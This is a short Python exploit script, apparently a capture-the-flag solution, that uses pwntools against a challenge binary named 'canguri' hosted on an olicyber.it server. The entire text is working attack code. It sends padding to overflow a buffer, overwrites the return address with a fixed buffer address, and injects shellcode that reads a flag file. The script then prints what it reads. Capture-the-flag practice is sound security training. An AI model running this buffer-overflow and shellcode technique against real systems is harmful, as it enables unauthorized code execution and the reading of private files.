from pwn import *
import sys

if args.REMOTE:
    p = remote("kangaroo.challs.olicyber.it", 20005)
else:
    p = process("/home/samu/Downloads/canguri")

context.binary = ELF("/home/samu/Downloads/canguri")


bufferone = 0x00000000004040c0

flag = "/home/problemuser/flag.txt"
pad_len = 0xb8 - 0x70
if len(sys.argv) > 1:
    pad_len = int(sys.argv[1])

log.info(f"Padding length: {pad_len}")

padding = b"A" * pad_len

shellcode = shellcraft.cat2(flag, 0x50)


p.sendline(padding + p64(bufferone))
p.sendline(asm(shellcode))
p.recvuntil(b"tardi.")
#p.interactive()
flag = p.recvall()
print(flag.decode())